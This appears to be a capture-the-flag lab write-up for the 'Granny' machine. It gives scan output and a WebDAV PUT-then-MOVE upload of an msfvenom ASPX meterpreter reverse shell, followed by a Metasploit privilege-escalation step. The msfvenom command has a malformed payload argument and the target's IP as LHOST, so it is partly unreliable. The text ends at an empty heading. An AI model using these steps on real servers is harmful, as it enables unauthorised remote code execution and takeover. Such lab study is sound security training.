# Granny Pivot Grandpa
As a learning exercise I am going to pivot from the Granny machine to the Grandpa machine. I'm going to block access to Grandpa using iptables
To list all the rules:<br>
```bash
iptables -L
```
Since I don't use iptables too often I'll break down the command here
```bash
iptables -A OUTPUT -d 10.10.10.14 -j DROP
```
-A: Append to the output rules
-d: Destination that is being impacted
-j: Jump to what chain we want. In this case we want to drop all packets with a destination IP of 10.10.10.14

## Information Gathering
Granny: 10.10.10.15
Grandpa: 10.10.10.14

## Scanning and Enumeration
Running enumeration scripts before manual spidering:<br>

### Nmap
```bash
# Nmap 7.92 scan initiated Tue Jan 11 13:40:58 2022 as: nmap -sC -sV -oN nmap/granny.nmap 10.10.10.15
Nmap scan report for 10.10.10.15
Host is up (0.028s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-methods: 
|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
| http-webdav-scan: 
|   Server Type: Microsoft-IIS/6.0
|   Server Date: Tue, 11 Jan 2022 18:56:06 GMT
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|   WebDAV type: Unknown
|_  Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
|_http-title: Under Construction
|_http-server-header: Microsoft-IIS/6.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jan 11 13:41:10 2022 -- 1 IP address (1 host up) scanned in 11.59 seconds
```

### Gobuster
```bash
gobuster dir -u http://10.10.10.15 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x html,php,txt -o gob/granny.gob

/images               (Status: 301) [Size: 149] [--> http://10.10.10.15/images/]
/Images               (Status: 301) [Size: 149] [--> http://10.10.10.15/Images/]
/IMAGES               (Status: 301) [Size: 149] [--> http://10.10.10.15/IMAGES/]
/_private             (Status: 301) [Size: 153] [--> http://10.10.10.15/%5Fprivate/]
/postinfo.html        (Status: 200) [Size: 2440]
```
### Nikto
Nikto is great because it scans for a lot of potentially vulnerable files/programs. I should start using this more often.
```bash
nikto -host 10.10.10.15 -format txt -o nikto/granny.nikto

- Nikto v2.1.6/2.1.5
+ Target Host: 10.10.10.15
+ Target Port: 80
+ GET Retrieved microsoftofficewebserver header: 5.0_Pub
+ GET Retrieved x-powered-by header: ASP.NET
+ GET The anti-clickjacking X-Frame-Options header is not present.
+ GET The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ GET Uncommon header 'microsoftofficewebserver' found, with contents: 5.0_Pub
+ GET The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ GET Retrieved x-aspnet-version header: 1.1.4322
+ OSVDB-397: PUT HTTP method 'PUT' allows clients to save files on the web server.
+ OSVDB-5646: DELETE HTTP method 'DELETE' allows clients to delete files on the web server.
+ OPTIONS Retrieved dasl header: <DAV:sql>
+ OPTIONS Retrieved dav header: 1, 2
+ OPTIONS Retrieved ms-author-via header: MS-FP/4.0,DAV
+ OPTIONS Uncommon header 'ms-author-via' found, with contents: MS-FP/4.0,DAV
+ OPTIONS Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH 
+ OSVDB-5646: GET HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
+ OSVDB-397: GET HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
+ OSVDB-5647: GET HTTP method ('Allow' Header): 'MOVE' may allow clients to change file locations on the web server.
+ OPTIONS Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH 
+ OSVDB-5646: GET HTTP method ('Public' Header): 'DELETE' may allow clients to remove files on the web server.
+ OSVDB-397: GET HTTP method ('Public' Header): 'PUT' method could allow clients to save files on the web server.
+ OSVDB-5647: GET HTTP method ('Public' Header): 'MOVE' may allow clients to change file locations on the web server.
+ OPTIONS WebDAV enabled (PROPFIND LOCK SEARCH PROPPATCH COPY MKCOL UNLOCK listed as allowed)
+ OSVDB-13431: PROPFIND PROPFIND HTTP verb may show the servers internal IP address: http://granny/_vti_bin/_vti_aut/author.dll
+ OSVDB-396: GET /_vti_bin/shtml.exe: Attackers may be able to crash FrontPage by requesting a DOS device, like shtml.exe/aux.htm -- a DoS was not attempted.
+ OSVDB-3233: GET /postinfo.html: Microsoft FrontPage default file found.
+ OSVDB-3233: GET /_private/: FrontPage directory found.
+ OSVDB-3233: GET /_vti_bin/: FrontPage directory found.
+ OSVDB-3233: GET /_vti_inf.html: FrontPage/SharePoint is installed and reveals its version number (check HTML source for more information).
+ OSVDB-3300: GET /_vti_bin/: shtml.exe/shtml.dll is available remotely. Some versions of the Front Page ISAPI filter are vulnerable to a DOS (not attempted).
+ OSVDB-3500: GET /_vti_bin/fpcount.exe: Frontpage counter CGI has been found. FP Server version 97 allows remote users to execute arbitrary system commands, though a vulnerability in this version could not be confirmed. CVE-1999-1376. BID-2252.
+ OSVDB-67: POST /_vti_bin/shtml.dll/_vti_rpc: The anonymous FrontPage user is revealed through a crafted POST.
+ GET /_vti_bin/_vti_adm/admin.dll: FrontPage/SharePoint file found.
```

### Davtest
Davtest tests and sees if a server is vulnerable to some form of arbitrary file upload which is enabled by the web server. I should really only ever check this if nmap detects PUT as a option.
```bash
davtest -url http://10.10.10.15

********************************************************
 Testing DAV connection
OPEN		SUCCEED:		http://10.10.10.15
********************************************************
NOTE	Random string for this session: BM7s7z
********************************************************
 Creating directory
MKCOL		SUCCEED:		Created http://10.10.10.15/DavTestDir_BM7s7z
********************************************************
 Sending test files
PUT	shtml	FAIL
PUT	jhtml	SUCCEED:	http://10.10.10.15/DavTestDir_BM7s7z/davtest_BM7s7z.jhtml
PUT	html	SUCCEED:	http://10.10.10.15/DavTestDir_BM7s7z/davtest_BM7s7z.html
PUT	pl	SUCCEED:	http://10.10.10.15/DavTestDir_BM7s7z/davtest_BM7s7z.pl
PUT	jsp	SUCCEED:	http://10.10.10.15/DavTestDir_BM7s7z/davtest_BM7s7z.jsp
PUT	cgi	FAIL
PUT	asp	FAIL
PUT	aspx	FAIL
PUT	php	SUCCEED:	http://10.10.10.15/DavTestDir_BM7s7z/davtest_BM7s7z.php
PUT	txt	SUCCEED:	http://10.10.10.15/DavTestDir_BM7s7z/davtest_BM7s7z.txt
PUT	cfm	SUCCEED:	http://10.10.10.15/DavTestDir_BM7s7z/davtest_BM7s7z.cfm
********************************************************
 Checking for test file execution
EXEC	jhtml	FAIL
EXEC	html	SUCCEED:	http://10.10.10.15/DavTestDir_BM7s7z/davtest_BM7s7z.html
EXEC	pl	FAIL
EXEC	jsp	FAIL
EXEC	php	FAIL
EXEC	txt	SUCCEED:	http://10.10.10.15/DavTestDir_BM7s7z/davtest_BM7s7z.txt
EXEC	cfm	FAIL

********************************************************
/usr/bin/davtest Summary:
Created: http://10.10.10.15/DavTestDir_BM7s7z
PUT File: http://10.10.10.15/DavTestDir_BM7s7z/davtest_BM7s7z.jhtml
PUT File: http://10.10.10.15/DavTestDir_BM7s7z/davtest_BM7s7z.html
PUT File: http://10.10.10.15/DavTestDir_BM7s7z/davtest_BM7s7z.pl
PUT File: http://10.10.10.15/DavTestDir_BM7s7z/davtest_BM7s7z.jsp
PUT File: http://10.10.10.15/DavTestDir_BM7s7z/davtest_BM7s7z.php
PUT File: http://10.10.10.15/DavTestDir_BM7s7z/davtest_BM7s7z.txt
PUT File: http://10.10.10.15/DavTestDir_BM7s7z/davtest_BM7s7z.cfm
Executes: http://10.10.10.15/DavTestDir_BM7s7z/davtest_BM7s7z.html
Executes: http://10.10.10.15/DavTestDir_BM7s7z/davtest_BM7s7z.txt
```

## Exploitation
From davtest, you can upload specific files to the server. One thing to note is from the HTTP header information
```
HTTP/1.1 201 Created
Connection: close
Date: Tue, 11 Jan 2022 19:20:14 GMT
Server: Microsoft-IIS/6.0
MicrosoftOfficeWebServer: 5.0_Pub
X-Powered-By: ASP.NET
Location: http://127.0.0.1/pwn.html
Content-Length: 0
Allow: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, LOCK, UNLOCK
```
This server uses ASP.NET which is sort of like Windows version of PHP. 
Set up a meterpreter reverse shell listener
```bash
msfconsole
msf6 > use exploits/multi/handler
msf6 > set payload windows/meterpreter/reverse_tcp
msf6 > set lhost 10.10.14.122
msf6 > set lport 9999
msf6 > run
```
One thing to note is that the server does not allow uploads of files with asp or aspx. However, it does allow uploads of html and txt. From the nmap scan, MOVE is an available option. Thus, upload the file in an acceptable format and then use MOVE to change the extension.<br>
Create the payload with msfvenom<br>
```bash
msfvenom -p aspx windows/meterpreter/reverse_tcp LHOST=10.10.10.15 LPORT=9999 -f aspx > ex.aspx
```
Then upload and MOVE using curl. You can also do all of this in BurpSuite.
```bash
curl -X PUT http://10.10.10.15/ex.txt --data-binary @ex.aspx
curl -X MOVE http://10.10.10.15/ex.txt -H "Destination: http://10.10.10.15/ex.aspx"
```
Your meterpreter listener should catch a shell.

## Privilege Escalation
Within the meterpreter session:<br>
```bash
meterpreter > bg
msf6 > search suggester
msf6 > set session 1
msf6 > run
```
I'll use windows/local/ms14_058_track_popup_menu

## Persistence